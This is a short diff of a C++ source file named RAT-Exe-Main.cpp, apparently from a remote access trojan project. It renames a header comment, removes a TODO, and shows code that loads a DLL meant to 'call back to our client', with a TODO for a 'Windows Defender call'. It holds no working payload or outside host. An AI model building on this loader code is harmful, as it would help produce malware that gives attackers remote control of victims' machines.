@@ -1,6 +1,6 @@
 // Patrick Sacchet
 // Version 1.0
-// RAT-Exe.cpp : This file contains the 'main' function. Program execution begins and ends there.
+// RAT-Exe-Main.cpp : This file contains the 'main' function. Program execution begins and ends there.
 
 #include "RAT-Exe-Main.h"
 
@@ -13,7 +13,6 @@ int main()
     // TODO: Windows Defender call
 
     // If we are in a 'operational' space load our DLL into memory so it can call back to our client 
-    // TODO: Dll load call for Internals-DLL
     DWORD lastError;
     LPCWSTR dllName = DLL_NAME;
     HMODULE hGetProcIDLL = LoadLibrary(dllName);
